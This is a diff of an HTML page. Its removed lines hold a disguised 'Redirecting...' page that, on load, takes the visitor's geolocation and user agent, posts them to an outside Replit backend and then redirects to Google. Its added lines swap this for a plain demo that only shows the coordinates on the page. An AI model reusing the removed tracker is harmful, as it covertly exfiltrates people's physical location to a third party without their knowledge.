@@ -1,48 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>Redirecting...</title>
-  <script>
-    function getLocationAndSend() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const data = {
-              lat,
-              lon,
-              userAgent: navigator.userAgent
-            };
-
-            // ✅ Replit backend URL
-            fetch("https://978a3738-0931-48bd-b637-b676a1b0408b-00-2piedy7lmpd23.pike.replit.dev/save", {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json"
-              },
-              body: JSON.stringify(data)
-            });
-
-            // ✅ Redirect after few seconds
-            setTimeout(() => {
-              window.location.href = "https://www.google.com"; // Change to your desired redirect
-            }, 2000);
-          },
-          () => {
-            window.location.href = "https://www.google.com";
-          }
-        );
-      } else {
-        window.location.href = "https://www.google.com";
-      }
-    }
-
-    window.onload = getLocationAndSend;
-  </script>
+  <title>Location Fetch Example</title>
 </head>
 <body>
-  <h2>Loading... Please wait</h2>
+  <h2>Your Location:</h2>
+  <p id="location">Fetching...</p>
+
+  <script>
+    function success(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      document.getElementById('location').textContent = 
+        `Latitude: ${latitude}, Longitude: ${longitude}`;
+    }
+
+    function error() {
+      document.getElementById('location').textContent = 
+        'Unable to retrieve your location';
+    }
+
+    if (!navigator.geolocation) {
+      document.getElementById('location').textContent = 
+        'Geolocation is not supported by your browser';
+    } else {
+      navigator.geolocation.getCurrentPosition(success, error);
+    }
+  </script>
 </body>
 </html>
